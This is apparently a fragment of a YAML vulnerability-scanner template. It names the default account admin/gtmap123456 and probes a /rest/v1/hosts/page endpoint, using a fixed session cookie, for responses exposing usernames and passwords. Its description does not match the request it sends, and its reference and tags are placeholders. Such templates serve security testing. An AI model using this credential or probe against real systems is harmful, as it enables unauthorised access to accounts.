  author: apple
  severity: high
  description: 系统默认账号 admin/gtmap123456
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET /rest/v1/hosts/page?page=1&limit=10  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Cookie: DJSSSIONID=3450CCCBE05B7BC3AACA5D2C07EA3298

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - password
      - type: word
        part: body
        words:
          - username
